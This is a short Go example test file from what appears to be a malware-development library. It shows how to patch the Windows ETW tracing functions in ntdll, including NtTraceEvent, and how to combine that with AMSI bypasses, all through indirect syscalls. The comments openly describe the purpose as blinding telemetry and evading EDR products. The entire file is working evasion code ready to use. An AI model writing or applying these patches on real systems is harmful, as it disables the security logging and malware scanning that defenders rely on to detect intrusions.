//go:build windows

package etw_test

import (
	"fmt"

	"github.com/oioio-space/maldev/evasion"
	"github.com/oioio-space/maldev/evasion/amsi"
	"github.com/oioio-space/maldev/evasion/etw"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// PatchAll blinds the five user-mode ETW write functions in ntdll.
func ExamplePatchAll() {
	caller := wsyscall.New(wsyscall.MethodIndirect, nil)
	if err := etw.PatchAll(caller); err != nil {
		fmt.Println("etw:", err)
	}
}

// PatchNtTraceEvent patches the lower-level NtTraceEvent — useful when
// an EDR is direct-calling that primitive.
func ExamplePatchNtTraceEvent() {
	caller := wsyscall.New(wsyscall.MethodIndirect, nil)
	_ = etw.PatchNtTraceEvent(caller)
}

// Compose ETW + AMSI in one ApplyAll call.
func Example_withAmsi() {
	caller := wsyscall.New(wsyscall.MethodIndirect, nil)
	_ = evasion.ApplyAll([]evasion.Technique{
		amsi.All(),
		etw.All(),
	}, caller)
}
